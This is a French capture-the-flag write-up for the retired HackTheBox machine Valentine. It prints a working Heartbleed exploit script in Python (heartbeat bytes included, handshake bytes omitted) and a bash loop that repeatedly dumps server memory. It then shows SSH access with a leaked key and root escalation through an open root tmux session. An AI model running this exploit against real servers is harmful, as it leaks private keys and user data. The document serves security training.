
---
title: "Valentine HTB"
date: 2025-08-04
description: "Résolution complète de la machine Valentine (retired) sur HackTheBox : failles Heartbleed, extraction de clés et accès SSH."
tags: ["HTB", "CTF", "Heartbleed", "Stego", "Linux", "Privilege Escalation"]
series: ["HTB Retired"]
---

## 🧠 Résumé

Cette machine `easy` exploite principalement une faille historique : **Heartbleed (CVE-2014-0160)**. Le but : extraire des données sensibles en mémoire, dont une **clé privée** chiffrée, brute-force son mot de passe, et obtenir une session SSH. Ensuite, une élévation de privilèges permet de récupérer le flag `root.txt`.

---

## 🔎 Enumération

### 🔍 Nmap

```bash
nmap -p- -T4 valentine.htb
```

Services identifiés :

- **22/tcp** - SSH (version ancienne)
- **80/tcp** - HTTP (Apache/2.2.22 Ubuntu)
- **443/tcp** - HTTPS

---

## 🎨 Analyse Web & Stegano

Sur le site HTTP : une image `omg.jpg`.

J’ai testé :

```bash
steghide extract -sf omg.jpg
stegseek --wordlist=/usr/share/wordlists/rockyou.txt omg.jpg
```

Aucune donnée utile. L’image ne cache probablement rien d’intéressant.

---

## 🔓 Analyse de /dev via le port 80

Deux fichiers sont accessibles :

- `notes.txt` (liste de tâches, pas de données sensibles)
- `hype_key` (contenu long, suspect)

Le fichier `hype_key` est un **dump hexadécimal** d’une **clé privée SSH chiffrée**.

---

## 🩸 Exploitation Heartbleed

Un scan Nmap confirme que le serveur est **vulnérable** à Heartbleed :

```bash
nmap -p 443 --script ssl-heartbleed valentine.htb
```

Pour automatiser les tests Heartbleed, j’ai écrit le script suivant :

### 🔁 Script `heartbleed_full.sh`

```bash
#!/bin/bash
# heartbleed_full.sh : automation du test Heartbleed + extraction ASCII

echo -n "🔢 Nombre d'itérations Heartbleed à exécuter : "
read NB

mkdir -p dumps

for i in $(seq -w 1 $NB); do
    echo "➡️  [Iteration $i]..."
    python2 heartbleed-exploit.py valentine.htb --output dumps/out_$i.txt --ascii &>/dev/null
done

echo "🧪 Extraction des chaînes ASCII utiles (>4 caractères)..."
strings dumps/out_*.txt | grep -Eo '[[:print:]]{5,}' | sort | uniq > out_ascii-full.txt

echo "✅ Fichier final généré : out_ascii-full.txt"
```

---

### 🐍 Script Python `heartbleed-exploit.py`

Ce script Python envoie un **heartbeat malicieux** et enregistre les réponses (texte brut ou hexdump). Il accepte un paramètre `--ascii` pour n’extraire que la partie texte.

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

import argparse
import struct
import socket
import sys

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''<...OMIS POUR BREVETÉ>''')  # Trop long à inclure ici, déjà dans ton script original
hb = h2bin('''18 03 02 00 03 01 40 00''')

def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf:
            return None
        buf += newbuf
        count -= len(newbuf)
    return buf

def hexdump(payload, ascii_only, outfile):
    with open(outfile, 'w') as f:
        for b in range(0, len(payload), 16):
            lin = payload[b: b + 16]
            if ascii_only:
                text = ''.join(c if 32 <= ord(c) <= 126 else '' for c in lin)
                f.write(text)
            else:
                hex_bytes = ' '.join('%02X' % ord(c) for c in lin)
                ascii_text = ''.join(c if 32 <= ord(c) <= 126 else '.' for c in lin)
                f.write('%04x: %-48s %s\n' % (b, hex_bytes, ascii_text))
        f.write('\n')

def hit_heartbleed(s, output_file, ascii_only):
    s.send(hb)
    while True:
        hdr = s.recv(5)
        if not hdr:
            print '[!] EOF - serveur a fermé la connexion'
            return False
        typ, ver, ln = struct.unpack('>BHH', hdr)
        payload = recvall(s, ln)
        if not payload:
            print '[!] EOF dans le payload'
            return False
        if typ == 24:
            print '✅ Données enregistrées dans : %s' % output_file
            hexdump(payload, ascii_only, output_file)
            return True
        elif typ == 21:
            print '[!] Alerte SSL (type 21) reçue.'
            return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host')
    parser.add_argument('--port', type=int, default=443)
    parser.add_argument('--output', default='out.txt')
    parser.add_argument('--ascii', action='store_true')
    args = parser.parse_args()

    print '🔌 Connexion à %s:%d...' % (args.host, args.port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((args.host, args.port))

    print '📤 Envoi de Client Hello...'
    s.send(hello)

    while True:
        hdr = s.recv(5)
        if not hdr:
            print '[!] Pas de réponse (handshake)'
            return
        typ, ver, ln = struct.unpack('>BHH', hdr)
        data = recvall(s, ln)
        if typ == 22 and ord(data[0]) == 0x0E:
            break

    print '🤝 Handshake terminé. 📡 Envoi heartbeat...'
    hit_heartbleed(s, args.output, args.ascii)
    s.close()

if __name__ == '__main__':
    main()
```

---

## 🏁 Connexion SSH

```bash
ssh -i hype_key_decrypted.pem hype@valentine.htb
```

---

## 🔼 Escalade de privilèges via tmux

Un processus root `tmux` est actif :

```bash
tmux -S /.devs/dev_sess
```

Connexion possible :

```bash
tmux a -t dev_sess
```

---

## 🎉 Conclusion

- ✅ Heartbleed pour l'accès mémoire
- 🔓 Clé SSH récupérée et déchiffrée
- 📈 Élévation via tmux root ouvert

> 💡 Ce writeup a été généré automatiquement à partir d’une session réelle, enrichie de notes personnelles et de scripts maison.
